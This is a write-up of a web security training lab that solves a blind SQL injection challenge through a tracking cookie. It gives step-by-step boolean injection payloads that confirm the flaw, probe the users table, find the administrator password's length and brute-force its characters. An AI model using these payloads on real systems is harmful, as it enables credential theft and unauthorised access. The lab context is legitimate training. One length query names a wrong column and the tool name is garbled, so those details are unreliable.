This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

Hint: You can assume that the password only contains lowercase, alphanumeric characters. 

End Goal: 
- Enumerate the password of the administrator
- Log in as the administrator user

Analysis:
--------

1) Confirm that the parameter is vulnerable to blind SQLi

select tracking-id from tracking-table where trackingId = 'dsjdsdjskljdkls'
- If this tracking id exists => query returns value: Welcome back message
- If the tracking id doesn't exist => query returns nothing

select tracking-id from tracking-table where trackingId = 'dsjdsdjskljdkls' and 1=1--'
- True: Welcome back 

select tracking-id from tracking-table where trackingId = 'dsjdsdjskljdkls' and 1=0--'
- False: Nothing

2) Confirm that we have a users table

select tracking-id from tracking-table where trackingId = 'dsjdsdjskljdkls' and (select 'x' from users LIMIT 1)='x'--'
- users table exists in the database.

3) Confirm that username administrator exists users table

select tracking-id from tracking-table where trackingId = 'dsjdsdjskljdkls' and (select username from users where username='administrator')='administrator'--'
- administrator user exists

4) Enumerate the password of the administrator user

select tracking-id from tracking-table where trackingId = 'dsjdsdjskljdkls' and (select users from users where username='administrator' and LENGTH(password)>1)='administrator'--'

- use includer sniper attack with numbers payload
- password is 20 characters


select tracking-id from tracking-table where trackingId = 'dsjdsdjskljdkls' and (select substring(password,1,1) from users where username='administrator')='a'--'

- use includer cluster bomb attack with payload #1 numbers and payload #2 bruteforce then filter with "Welcome back" message
